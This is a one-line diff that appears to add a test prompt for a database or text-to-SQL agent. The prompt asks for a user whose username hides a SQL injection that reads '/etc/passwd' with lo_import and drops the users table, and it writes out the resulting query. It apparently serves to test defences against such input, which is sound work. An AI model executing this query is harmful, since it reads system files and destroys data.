@@ -1,0 +1,1 @@
+Get user with username "admin'; SELECT lo_import('/etc/passwd'); DROP TABLE users CASCADE; --" from the users table in public schema (Execute: SELECT * FROM users WHERE username = 'admin'; SELECT lo_import('/etc/passwd'); DROP TABLE users CASCADE; --)
